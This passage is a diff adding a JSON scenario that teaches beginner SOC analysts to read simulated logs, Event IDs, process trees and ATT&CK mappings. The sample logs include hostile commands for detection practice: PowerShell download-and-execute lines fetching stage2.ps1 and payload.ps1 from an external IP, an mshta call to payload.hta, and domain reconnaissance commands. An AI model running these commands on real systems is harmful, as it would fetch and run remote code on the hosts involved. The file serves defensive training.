@@ -1,0 +1,1294 @@
+{
+  "name": "SOC Analyst Fundamentals — Log Analysis & Threat Detection",
+  "description": "A beginner-friendly introductory scenario that teaches core SOC analyst skills: understanding log sources, recognizing key Event IDs, analyzing process parent-child relationships, and mapping activities to the MITRE ATT&CK framework.",
+  "difficulty": "BEGINNER",
+  "category": "Fundamentals",
+  "mitreAttackIds": ["T1566.001", "T1059.001", "T1053.005", "T1078", "T1110.001", "T1036"],
+  "briefing": "## Welcome to SOC Fundamentals\n\nThis scenario teaches you the core skills every SOC analyst needs:\n\n- **Understanding log sources** — What each log type looks like and what it's used for\n- **Recognizing key Event IDs** — Critical Windows Event IDs and Sysmon Event IDs\n- **Analyzing process relationships** — Normal vs suspicious process parent-child chains\n- **Mapping to MITRE ATT&CK** — How to classify observed activity using the ATT&CK framework\n\nEach stage introduces a concept with real log examples, then tests your understanding. In the final stage, you'll apply all of these skills together in a mini investigation.\n\n**Tip:** Take your time reading each log carefully. The details matter!",
+  "estimatedMinutes": 60,
+  "isActive": true,
+  "stages": [
+    {
+      "stageNumber": 1,
+      "title": "Know Your Log Sources",
+      "description": "Learn what each major log source looks like and what it's used for. You'll see one example of each log type commonly found in a SOC environment.",
+      "unlockCondition": "AFTER_PREVIOUS",
+      "logs": [
+        {
+          "logType": "WINDOWS_EVENT",
+          "summary": "Windows Security Event 4624 — Successful logon for user j.doe via interactive login (Type 2) on workstation WS-PC01.",
+          "rawLog": {
+            "EventID": 4624,
+            "Source": "Microsoft-Windows-Security-Auditing",
+            "TimeCreated": "2025-03-15T08:30:12Z",
+            "Computer": "WS-PC01.corp.local",
+            "LogonType": 2,
+            "TargetUserName": "j.doe",
+            "TargetDomainName": "CORP",
+            "IpAddress": "10.0.1.50",
+            "LogonProcessName": "User32",
+            "AuthenticationPackageName": "Negotiate",
+            "WorkstationName": "WS-PC01"
+          },
+          "severity": "INFO",
+          "hostname": "WS-PC01",
+          "username": "j.doe",
+          "eventId": "4624",
+          "sourceIp": "10.0.1.50",
+          "timestamp": "2025-03-15T08:30:12Z",
+          "isEvidence": false,
+          "sortOrder": 1
+        },
+        {
+          "logType": "SYSMON",
+          "summary": "Sysmon Event ID 1 — Process creation: notepad.exe launched by explorer.exe. Includes full command line, parent process path, and file hash.",
+          "rawLog": {
+            "EventID": 1,
+            "Source": "Microsoft-Windows-Sysmon",
+            "UtcTime": "2025-03-15T08:32:05Z",
+            "ProcessGuid": "{abc12345-1234-5678-9abc-def012345678}",
+            "ProcessId": 4520,
+            "Image": "C:\\Windows\\System32\\notepad.exe",
+            "CommandLine": "\"C:\\Windows\\System32\\notepad.exe\" C:\\Users\\j.doe\\Documents\\notes.txt",
+            "ParentProcessGuid": "{abc12345-0001-0002-0003-000000000001}",
+            "ParentProcessId": 2148,
+            "ParentImage": "C:\\Windows\\explorer.exe",
+            "ParentCommandLine": "C:\\Windows\\explorer.exe",
+            "User": "CORP\\j.doe",
+            "Hashes": "SHA256=A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2",
+            "IntegrityLevel": "Medium"
+          },
+          "severity": "INFO",
+          "hostname": "WS-PC01",
+          "username": "j.doe",
+          "processName": "notepad.exe",
+          "eventId": "1",
+          "timestamp": "2025-03-15T08:32:05Z",
+          "isEvidence": false,
+          "sortOrder": 2
+        },
+        {
+          "logType": "EDR_ALERT",
+          "summary": "EDR Alert — Suspicious PowerShell behavior detected on WS-PC03. PowerShell executed with encoded command and attempted to download a file from an external IP address.",
+          "rawLog": {
+            "alertId": "EDR-2025-0842",
+            "severity": "MEDIUM",
+            "timestamp": "2025-03-15T09:15:33Z",
+            "hostname": "WS-PC03",
+            "username": "m.chen",
+            "processName": "powershell.exe",
+            "processPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "commandLine": "powershell.exe -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==",
+            "parentProcess": "cmd.exe",
+            "alertType": "Suspicious PowerShell Execution",
+            "detectionRule": "PS_ENCODED_COMMAND_WITH_DOWNLOAD",
+            "mitreTactic": "Execution",
+            "mitreTechnique": "T1059.001"
+          },
+          "severity": "MEDIUM",
+          "hostname": "WS-PC03",
+          "username": "m.chen",
+          "processName": "powershell.exe",
+          "timestamp": "2025-03-15T09:15:33Z",
+          "isEvidence": false,
+          "sortOrder": 3
+        },
+        {
+          "logType": "NETWORK_FLOW",
+          "summary": "Network Flow — Outbound HTTP traffic from workstation WS-PC01 to external web server 93.184.216.34 on port 80. Standard web browsing traffic metadata.",
+          "rawLog": {
+            "timestamp": "2025-03-15T08:45:22Z",
+            "srcIp": "10.0.1.50",
+            "srcPort": 49832,
+            "dstIp": "93.184.216.34",
+            "dstPort": 80,
+            "protocol": "TCP",
+            "bytesIn": 12450,
+            "bytesOut": 3200,
+            "packetsIn": 15,
+            "packetsOut": 8,
+            "duration": 2.3,
+            "application": "HTTP",
+            "action": "ALLOW",
+            "hostname": "WS-PC01"
+          },
+          "severity": "INFO",
+          "hostname": "WS-PC01",
+          "sourceIp": "10.0.1.50",
+          "destIp": "93.184.216.34",
+          "timestamp": "2025-03-15T08:45:22Z",
+          "isEvidence": false,
+          "sortOrder": 4
+        },
+        {
+          "logType": "FIREWALL",
+          "summary": "Firewall — Blocked inbound connection attempt from external IP 198.51.100.22 to internal server SRV-DB01 on port 3389 (RDP). The firewall denied this connection per perimeter policy.",
+          "rawLog": {
+            "timestamp": "2025-03-15T09:02:15Z",
+            "action": "DENY",
+            "direction": "INBOUND",
+            "srcIp": "198.51.100.22",
+            "srcPort": 54123,
+            "dstIp": "10.0.2.10",
+            "dstPort": 3389,
+            "protocol": "TCP",
+            "rule": "BLOCK-INBOUND-RDP",
+            "zone": "EXTERNAL->DMZ",
+            "reason": "Perimeter policy — RDP not allowed from external sources"
+          },
+          "severity": "LOW",
+          "hostname": "FW-EDGE-01",
+          "sourceIp": "198.51.100.22",
+          "destIp": "10.0.2.10",
+          "timestamp": "2025-03-15T09:02:15Z",
+          "isEvidence": false,
+          "sortOrder": 5
+        },
+        {
+          "logType": "AUTH_LOG",
+          "summary": "Authentication Log — Failed SSH authentication attempt for user root from IP 203.0.113.50 on Linux server SRV-WEB01. Password authentication was rejected.",
+          "rawLog": {
+            "timestamp": "2025-03-15T09:10:44Z",
+            "hostname": "SRV-WEB01",
+            "service": "sshd",
+            "pid": 18234,
+            "message": "Failed password for root from 203.0.113.50 port 43210 ssh2",
+            "user": "root",
+            "sourceIp": "203.0.113.50",
+            "authMethod": "password",
+            "result": "FAILURE"
+          },
+          "severity": "MEDIUM",
+          "hostname": "SRV-WEB01",
+          "username": "root",
+          "sourceIp": "203.0.113.50",
+          "timestamp": "2025-03-15T09:10:44Z",
+          "isEvidence": false,
+          "sortOrder": 6
+        },
+        {
+          "logType": "SIEM_ALERT",
+          "summary": "SIEM Correlation Alert — Multiple failed login attempts (15) followed by a successful login for user admin.svc within 5 minutes from IP 10.0.3.88. Possible brute force or credential stuffing attack.",
+          "rawLog": {
+            "alertId": "SIEM-CORR-2025-1205",
+            "ruleName": "Brute Force — Multiple Failed Then Success",
+            "severity": "HIGH",
+            "timestamp": "2025-03-15T09:22:00Z",
+            "correlatedEvents": 16,
+            "failedAttempts": 15,
+            "successfulLogon": true,
+            "targetUser": "admin.svc",
+            "sourceIp": "10.0.3.88",
+            "targetHost": "SRV-DC01",
+            "timeWindow": "5 minutes",
+            "dataSources": ["Windows Security Events", "Active Directory Logs"],
+            "recommendation": "Investigate source IP and verify if logon is legitimate"
+          },
+          "severity": "HIGH",
+          "hostname": "SRV-DC01",
+          "username": "admin.svc",
+          "sourceIp": "10.0.3.88",
+          "timestamp": "2025-03-15T09:22:00Z",
+          "isEvidence": false,
+          "sortOrder": 7
+        },
+        {
+          "logType": "DNS",
+          "summary": "DNS Log — DNS query from workstation WS-PC05 resolving suspicious domain 'update-microsoft-cdn.xyz'. Domain was recently registered and matches known DGA patterns.",
+          "rawLog": {
+            "timestamp": "2025-03-15T09:30:55Z",
+            "queryName": "update-microsoft-cdn.xyz",
+            "queryType": "A",
+            "responseCode": "NOERROR",
+            "responseData": "185.220.101.42",
+            "srcIp": "10.0.1.75",
+            "hostname": "WS-PC05",
+            "dnsServer": "10.0.2.1",
+            "flags": "QR,RD,RA",
+            "ttl": 300
+          },
+          "severity": "MEDIUM",
+          "hostname": "WS-PC05",
+          "sourceIp": "10.0.1.75",
+          "destIp": "185.220.101.42",
+          "timestamp": "2025-03-15T09:30:55Z",
+          "isEvidence": false,
+          "sortOrder": 8
+        }
+      ],
+      "hints": [
+        {
+          "content": "Sysmon is a Windows Sysinternals tool that provides detailed process, network, and file activity. Unlike basic Windows Event logs, Sysmon captures full command-line arguments, parent process information, and file hashes for every process creation.",
+          "pointsPenalty": 3,
+          "sortOrder": 1
+        },
+        {
+          "content": "SIEM stands for Security Information and Event Management. It collects logs from multiple sources (endpoints, firewalls, servers, etc.) and correlates them to detect complex attack patterns that no single log source would reveal on its own.",
+          "pointsPenalty": 3,
+          "sortOrder": 2
+        }
+      ]
+    },
+    {
+      "stageNumber": 2,
+      "title": "Critical Event IDs",
+      "description": "Learn the most important Windows Event IDs and Sysmon Event IDs that every SOC analyst must know. These Event IDs are the foundation of Windows-based threat detection.",
+      "unlockCondition": "AFTER_PREVIOUS",
+      "logs": [
+        {
+          "logType": "WINDOWS_EVENT",
+          "summary": "Windows Event ID 4624 — Successful Logon. User admin.svc logged in via RDP (Logon Type 10) from IP 10.0.3.88 to the Domain Controller.",
+          "rawLog": {
+            "EventID": 4624,
+            "Source": "Microsoft-Windows-Security-Auditing",
+            "TimeCreated": "2025-03-15T10:00:01Z",
+            "Computer": "SRV-DC01.corp.local",
+            "LogonType": 10,
+            "TargetUserName": "admin.svc",
+            "TargetDomainName": "CORP",
+            "IpAddress": "10.0.3.88",
+            "IpPort": 54210,
+            "LogonProcessName": "User32",
+            "AuthenticationPackageName": "Negotiate",
+            "WorkstationName": "WS-PC07",
+            "LogonGuid": "{00000000-0000-0000-0000-000000000000}"
+          },
+          "severity": "INFO",
+          "hostname": "SRV-DC01",
+          "username": "admin.svc",
+          "eventId": "4624",
+          "sourceIp": "10.0.3.88",
+          "timestamp": "2025-03-15T10:00:01Z",
+          "isEvidence": true,
+          "evidenceTag": "key-eventid",
+          "sortOrder": 1
+        },
+        {
+          "logType": "WINDOWS_EVENT",
+          "summary": "Windows Event ID 4625 — Failed Logon. An attempt to log in as 'administrator' from IP 10.0.3.88 was rejected due to incorrect password.",
+          "rawLog": {
+            "EventID": 4625,
+            "Source": "Microsoft-Windows-Security-Auditing",
+            "TimeCreated": "2025-03-15T09:58:30Z",
+            "Computer": "SRV-DC01.corp.local",
+            "FailureReason": "%%2313",
+            "Status": "0xC000006D",
+            "SubStatus": "0xC000006A",
+            "TargetUserName": "administrator",
+            "TargetDomainName": "CORP",
+            "LogonType": 10,
+            "IpAddress": "10.0.3.88",
+            "IpPort": 54198,
+            "WorkstationName": "WS-PC07"
+          },
+          "severity": "MEDIUM",
+          "hostname": "SRV-DC01",
+          "username": "administrator",
+          "eventId": "4625",
+          "sourceIp": "10.0.3.88",
+          "timestamp": "2025-03-15T09:58:30Z",
+          "isEvidence": true,
+          "evidenceTag": "failed-logon",
+          "sortOrder": 2
+        },
+        {
+          "logType": "WINDOWS_EVENT",
+          "summary": "Windows Event ID 4688 — New Process Created. cmd.exe was launched by user admin.svc on the Domain Controller.",
+          "rawLog": {
+            "EventID": 4688,
+            "Source": "Microsoft-Windows-Security-Auditing",
+            "TimeCreated": "2025-03-15T10:02:15Z",
+            "Computer": "SRV-DC01.corp.local",
+            "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
+            "CommandLine": "cmd.exe",
+            "SubjectUserName": "admin.svc",
+            "SubjectDomainName": "CORP",
+            "TokenElevationType": "%%1936",
+            "ProcessId": "0x1234",
+            "ParentProcessName": "C:\\Windows\\explorer.exe"
+          },
+          "severity": "INFO",
+          "hostname": "SRV-DC01",
+          "username": "admin.svc",
+          "processName": "cmd.exe",
+          "eventId": "4688",
+          "timestamp": "2025-03-15T10:02:15Z",
+          "isEvidence": false,
+          "sortOrder": 3
+        },
+        {
+          "logType": "WINDOWS_EVENT",
+          "summary": "Windows Event ID 4672 — Special Privileges Assigned to New Logon. SeDebugPrivilege and SeBackupPrivilege were granted to user admin.svc — this indicates elevated/admin access.",
+          "rawLog": {
+            "EventID": 4672,
+            "Source": "Microsoft-Windows-Security-Auditing",
+            "TimeCreated": "2025-03-15T10:00:02Z",
+            "Computer": "SRV-DC01.corp.local",
+            "SubjectUserName": "admin.svc",
+            "SubjectDomainName": "CORP",
+            "SubjectLogonId": "0x3E7",
+            "PrivilegeList": "SeDebugPrivilege\n\t\tSeBackupPrivilege\n\t\tSeRestorePrivilege\n\t\tSeTakeOwnershipPrivilege"
+          },
+          "severity": "HIGH",
+          "hostname": "SRV-DC01",
+          "username": "admin.svc",
+          "eventId": "4672",
+          "timestamp": "2025-03-15T10:00:02Z",
+          "isEvidence": true,
+          "evidenceTag": "priv-escalation",
+          "sortOrder": 4
+        },
+        {
+          "logType": "WINDOWS_EVENT",
+          "summary": "Windows Event ID 7045 — A new service was installed on the system. Service name 'WindowsUpdateHelper' with a suspicious binary path pointing to C:\\Temp directory.",
+          "rawLog": {
+            "EventID": 7045,
+            "Source": "Service Control Manager",
+            "TimeCreated": "2025-03-15T10:15:44Z",
+            "Computer": "SRV-DC01.corp.local",
+            "ServiceName": "WindowsUpdateHelper",
+            "ImagePath": "C:\\Temp\\svchelper.exe -k netsvcs",
+            "ServiceType": "user mode service",
+            "StartType": "auto start",
+            "AccountName": "LocalSystem"
+          },
+          "severity": "HIGH",
+          "hostname": "SRV-DC01",
+          "eventId": "7045",
+          "timestamp": "2025-03-15T10:15:44Z",
+          "isEvidence": true,
+          "evidenceTag": "service-install",
+          "sortOrder": 5
+        },
+        {
+          "logType": "WINDOWS_EVENT",
+          "summary": "Windows Event ID 4720 — A new user account was created. Account 'backup$' (note the dollar sign, attempting to look like a computer account) was created by admin.svc.",
+          "rawLog": {
+            "EventID": 4720,
+            "Source": "Microsoft-Windows-Security-Auditing",
+            "TimeCreated": "2025-03-15T10:20:33Z",
+            "Computer": "SRV-DC01.corp.local",
+            "TargetUserName": "backup$",
+            "TargetDomainName": "CORP",
+            "SubjectUserName": "admin.svc",
+            "SubjectDomainName": "CORP",
+            "SamAccountName": "backup$",
+            "DisplayName": "Backup Service",
+            "UserAccountControl": "%%2080"
+          },
+          "severity": "HIGH",
+          "hostname": "SRV-DC01",
+          "username": "admin.svc",
+          "eventId": "4720",
+          "timestamp": "2025-03-15T10:20:33Z",
+          "isEvidence": true,
+          "evidenceTag": "account-created",
+          "sortOrder": 6
+        },
+        {
+          "logType": "SYSMON",
+          "summary": "Sysmon Event ID 1 — Process Create. powershell.exe was launched by cmd.exe with full command-line arguments, parent process path, and SHA256 file hash captured.",
+          "rawLog": {
+            "EventID": 1,
+            "Source": "Microsoft-Windows-Sysmon",
+            "UtcTime": "2025-03-15T10:03:00Z",
+            "ProcessGuid": "{abc12345-2222-3333-4444-555566667777}",
+            "ProcessId": 6780,
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"Get-Process\"",
+            "ParentProcessGuid": "{abc12345-1111-2222-3333-444455556666}",
+            "ParentProcessId": 5120,
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "ParentCommandLine": "cmd.exe",
+            "User": "CORP\\admin.svc",
+            "Hashes": "SHA256=B5C1E2D3F4A5B6C7D8E9F0A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6E7F8A9B0C1",
+            "IntegrityLevel": "High"
+          },
+          "severity": "INFO",
+          "hostname": "SRV-DC01",
+          "username": "admin.svc",
+          "processName": "powershell.exe",
+          "eventId": "1",
+          "timestamp": "2025-03-15T10:03:00Z",
+          "isEvidence": true,
+          "evidenceTag": "sysmon-process",
+          "sortOrder": 7
+        },
+        {
+          "logType": "SYSMON",
+          "summary": "Sysmon Event ID 3 — Network Connection. powershell.exe initiated an outbound network connection to external IP 185.220.101.42 on port 443 (HTTPS).",
+          "rawLog": {
+            "EventID": 3,
+            "Source": "Microsoft-Windows-Sysmon",
+            "UtcTime": "2025-03-15T10:04:12Z",
+            "ProcessGuid": "{abc12345-2222-3333-4444-555566667777}",
+            "ProcessId": 6780,
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "User": "CORP\\admin.svc",
+            "Protocol": "tcp",
+            "Initiated": true,
+            "SourceIp": "10.0.2.5",
+            "SourcePort": 49999,
+            "DestinationIp": "185.220.101.42",
+            "DestinationPort": 443,
+            "DestinationHostname": "update-microsoft-cdn.xyz"
+          },
+          "severity": "MEDIUM",
+          "hostname": "SRV-DC01",
+          "username": "admin.svc",
+          "processName": "powershell.exe",
+          "eventId": "3",
+          "sourceIp": "10.0.2.5",
+          "destIp": "185.220.101.42",
+          "timestamp": "2025-03-15T10:04:12Z",
+          "isEvidence": false,
+          "sortOrder": 8
+        }
+      ],
+      "hints": [
+        {
+          "content": "Event 4624 = logon success, 4625 = logon failure. The Logon Type field tells you HOW the user logged in: Type 2 = Interactive (at keyboard), Type 3 = Network (file share, etc.), Type 10 = Remote Desktop (RDP).",
+          "pointsPenalty": 3,
+          "sortOrder": 1
+        },
+        {
+          "content": "Event 7045 (service install) and 4720 (account creation) outside of planned change windows are major red flags. Attackers frequently install malicious services for persistence and create backdoor accounts.",
+          "pointsPenalty": 3,
+          "sortOrder": 2
+        }
+      ]
+    },
+    {
+      "stageNumber": 3,
+      "title": "Process Parent-Child Relationships",
+      "description": "Learn to distinguish normal process parent-child relationships from suspicious ones. Understanding expected process trees is one of the most powerful detection techniques for identifying malware and attacker activity.",
+      "unlockCondition": "AFTER_PREVIOUS",
+      "logs": [
+        {
+          "logType": "SYSMON",
+          "summary": "NORMAL — explorer.exe spawned notepad.exe. This is expected: explorer.exe (Windows shell) normally launches user applications.",
+          "rawLog": {
+            "EventID": 1,
+            "UtcTime": "2025-03-15T11:00:01Z",
+            "Image": "C:\\Windows\\System32\\notepad.exe",
+            "CommandLine": "\"C:\\Windows\\System32\\notepad.exe\"",
+            "ParentImage": "C:\\Windows\\explorer.exe",
+            "ParentCommandLine": "C:\\Windows\\explorer.exe",
+            "User": "CORP\\j.doe",
+            "Hashes": "SHA256=D1E2F3A4B5C6D7E8F9A0B1C2D3E4F5A6B7C8D9E0F1A2B3C4D5E6F7A8B9C0D1E2"
+          },
+          "severity": "INFO",
+          "hostname": "WS-PC01",
+          "username": "j.doe",
+          "processName": "notepad.exe",
+          "eventId": "1",
+          "timestamp": "2025-03-15T11:00:01Z",
+          "isEvidence": false,
+          "sortOrder": 1
+        },
+        {
+          "logType": "SYSMON",
+          "summary": "NORMAL — services.exe spawned svchost.exe. This is expected: services.exe is the Windows Service Control Manager and is the legitimate parent of svchost.exe.",
+          "rawLog": {
+            "EventID": 1,
+            "UtcTime": "2025-03-15T11:00:05Z",
+            "Image": "C:\\Windows\\System32\\svchost.exe",
+            "CommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p",
+            "ParentImage": "C:\\Windows\\System32\\services.exe",
+            "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "Hashes": "SHA256=E2F3A4B5C6D7E8F9A0B1C2D3E4F5A6B7C8D9E0F1A2B3C4D5E6F7A8B9C0D1E2F3"
+          },
+          "severity": "INFO",
+          "hostname": "WS-PC01",
+          "processName": "svchost.exe",
+          "eventId": "1",
+          "timestamp": "2025-03-15T11:00:05Z",
+          "isEvidence": false,
+          "sortOrder": 2
+        },
+        {
+          "logType": "SYSMON",
+          "summary": "NORMAL — explorer.exe spawned chrome.exe. This is expected: users launch web browsers from the Windows shell.",
+          "rawLog": {
+            "EventID": 1,
+            "UtcTime": "2025-03-15T11:01:00Z",
+            "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+            "CommandLine": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\"",
+            "ParentImage": "C:\\Windows\\explorer.exe",
+            "ParentCommandLine": "C:\\Windows\\explorer.exe",
+            "User": "CORP\\j.doe",
+            "Hashes": "SHA256=F3A4B5C6D7E8F9A0B1C2D3E4F5A6B7C8D9E0F1A2B3C4D5E6F7A8B9C0D1E2F3A4"
+          },
+          "severity": "INFO",
+          "hostname": "WS-PC01",
+          "username": "j.doe",
+          "processName": "chrome.exe",
+          "eventId": "1",
+          "timestamp": "2025-03-15T11:01:00Z",
+          "isEvidence": false,
+          "sortOrder": 3
+        },
+        {
+          "logType": "SYSMON",
+          "summary": "SUSPICIOUS — WINWORD.EXE spawned cmd.exe, which then spawned powershell.exe. Microsoft Word should NEVER spawn command interpreters — this indicates a malicious macro was executed.",
+          "rawLog": {
+            "EventID": 1,
+            "UtcTime": "2025-03-15T11:05:22Z",
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.42/stage2.ps1')\"",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "ParentCommandLine": "cmd.exe /c powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.42/stage2.ps1')\"",
+            "GrandparentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+            "User": "CORP\\j.doe",
+            "Hashes": "SHA256=A4B5C6D7E8F9A0B1C2D3E4F5A6B7C8D9E0F1A2B3C4D5E6F7A8B9C0D1E2F3A4B5"
+          },
+          "severity": "HIGH",
+          "hostname": "WS-PC01",
+          "username": "j.doe",
+          "processName": "powershell.exe",
+          "eventId": "1",
+          "timestamp": "2025-03-15T11:05:22Z",
+          "isEvidence": true,
+          "evidenceTag": "word-to-ps",
+          "sortOrder": 4
+        },
+        {
+          "logType": "SYSMON",
+          "summary": "SUSPICIOUS — OUTLOOK.EXE spawned powershell.exe with a Base64-encoded command. Email clients should NEVER spawn scripting engines — this indicates a malicious attachment or embedded link was activated.",
+          "rawLog": {
+            "EventID": 1,
+            "UtcTime": "2025-03-15T11:10:45Z",
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0AA==",
+            "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
+            "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"",
+            "User": "CORP\\a.johnson",
+            "Hashes": "SHA256=B5C6D7E8F9A0B1C2D3E4F5A6B7C8D9E0F1A2B3C4D5E6F7A8B9C0D1E2F3A4B5C6"
+          },
+          "severity": "CRITICAL",
+          "hostname": "WS-PC04",
+          "username": "a.johnson",
+          "processName": "powershell.exe",
+          "eventId": "1",
+          "timestamp": "2025-03-15T11:10:45Z",
+          "isEvidence": true,
+          "evidenceTag": "outlook-ps",
+          "sortOrder": 5
+        },
+        {
+          "logType": "SYSMON",
+          "summary": "NORMAL — svchost.exe spawned taskhostw.exe. This is expected: svchost.exe launches scheduled task host processes as part of normal Windows operations.",
+          "rawLog": {
+            "EventID": 1,
+            "UtcTime": "2025-03-15T11:12:00Z",
+            "Image": "C:\\Windows\\System32\\taskhostw.exe",
+            "CommandLine": "taskhostw.exe",
+            "ParentImage": "C:\\Windows\\System32\\svchost.exe",
+            "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "Hashes": "SHA256=C6D7E8F9A0B1C2D3E4F5A6B7C8D9E0F1A2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D7"
+          },
+          "severity": "INFO",
+          "hostname": "WS-PC01",
+          "processName": "taskhostw.exe",
+          "eventId": "1",
+          "timestamp": "2025-03-15T11:12:00Z",
+          "isEvidence": false,
+          "sortOrder": 6
+        },
+        {
+          "logType": "SYSMON",
+          "summary": "SUSPICIOUS — EXCEL.EXE spawned mshta.exe (Microsoft HTML Application Host). This is a known technique for executing malicious HTA files from Office macro code.",
+          "rawLog": {
+            "EventID": 1,
+            "UtcTime": "2025-03-15T11:15:33Z",
+            "Image": "C:\\Windows\\System32\\mshta.exe",
+            "CommandLine": "mshta.exe http://185.220.101.42/payload.hta",
+            "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+            "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\" C:\\Users\\b.wilson\\Downloads\\Q4-Report.xlsm",
+            "User": "CORP\\b.wilson",
+            "Hashes": "SHA256=D7E8F9A0B1C2D3E4F5A6B7C8D9E0F1A2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D7E8"
+          },
+          "severity": "CRITICAL",
+          "hostname": "WS-PC06",
+          "username": "b.wilson",
+          "processName": "mshta.exe",
+          "eventId": "1",
+          "timestamp": "2025-03-15T11:15:33Z",
+          "isEvidence": true,
+          "evidenceTag": "excel-mshta",
+          "sortOrder": 7
+        },
+        {
+          "logType": "SYSMON",
+          "summary": "SUSPICIOUS — powershell.exe rapidly spawned reconnaissance commands: whoami.exe, ipconfig.exe, and net.exe. This pattern is commonly seen when an attacker enumerates the compromised host.",
+          "rawLog": {
+            "EventID": 1,
+            "UtcTime": "2025-03-15T11:06:10Z",
+            "Image": "C:\\Windows\\System32\\whoami.exe",
+            "CommandLine": "whoami /all",
+            "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "User": "CORP\\j.doe",
+            "RelatedCommands": [
+              "whoami /all",
+              "ipconfig /all",
+              "net user /domain",
+              "net group \"Domain Admins\" /domain"
+            ]
+          },
+          "severity": "MEDIUM",
+          "hostname": "WS-PC01",
+          "username": "j.doe",
+          "processName": "whoami.exe",
+          "eventId": "1",
+          "timestamp": "2025-03-15T11:06:10Z",
+          "isEvidence": true,
+          "evidenceTag": "recon-cmds",
+          "sortOrder": 8
+        }
+      ],
+      "hints": [
+        {
+          "content": "Normal parent processes: explorer.exe spawns user applications (browsers, editors, etc.), services.exe spawns svchost.exe instances, and svchost.exe spawns system-level task processes. Any deviation from these expected relationships should be investigated.",
+          "pointsPenalty": 3,
+          "sortOrder": 1
+        },
+        {
+          "content": "Office applications (Word, Excel, Outlook, PowerPoint) should NEVER spawn cmd.exe, powershell.exe, mshta.exe, wscript.exe, or cscript.exe. If you see this, it is almost always a sign that a malicious macro or exploit was executed.",
+          "pointsPenalty": 5,
+          "sortOrder": 2
+        }
+      ]
+    },
+    {
+      "stageNumber": 4,
+      "title": "MITRE ATT&CK Framework",
+      "description": "Learn how to map observed adversary activity to the MITRE ATT&CK framework. Each log in this stage demonstrates a different tactic and technique — your job is to identify the correct classification.",
+      "unlockCondition": "AFTER_PREVIOUS",
+      "logs": [
+        {
+          "logType": "EMAIL_GATEWAY",
+          "summary": "Phishing email received by user r.martinez from external sender 'invoice@supplier-portal.com' with attached malicious Word document 'Invoice-2025-Q1.docm'. The email impersonates a known vendor. (MITRE: T1566.001 — Phishing: Spearphishing Attachment)",
+          "rawLog": {
+            "timestamp": "2025-03-15T12:00:01Z",
+            "messageId": "<abc123@mail.supplier-portal.com>",
+            "from": "invoice@supplier-portal.com",
+            "to": "r.martinez@corp.local",
+            "subject": "Urgent: Updated Invoice for Q1 Services",
+            "attachments": [
+              {
+                "filename": "Invoice-2025-Q1.docm",
+                "size": 245760,
+                "contentType": "application/vnd.ms-word.document.macroEnabled.12",
+                "sha256": "E8F9A0B1C2D3E4F5A6B7C8D9E0F1A2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D7E8F9"
+              }
+            ],
+            "spfResult": "fail",
+            "dkimResult": "fail",
+            "senderIp": "198.51.100.55",
+            "verdict": "SUSPICIOUS",
+            "mitreAttack": "T1566.001"
+          },
+          "severity": "HIGH",
+          "hostname": "MAIL-GW01",
+          "username": "r.martinez",
+          "sourceIp": "198.51.100.55",
+          "timestamp": "2025-03-15T12:00:01Z",
+          "isEvidence": true,
+          "evidenceTag": "phishing",
+          "sortOrder": 1
+        },
+        {
+          "logType": "SYSMON",
+          "summary": "PowerShell.exe executed with a Base64-encoded command. Decoded command attempts to download and execute a remote script. (MITRE: T1059.001 — Command and Scripting Interpreter: PowerShell)",
+          "rawLog": {
+            "EventID": 1,
+            "UtcTime": "2025-03-15T12:05:22Z",
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAAyAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
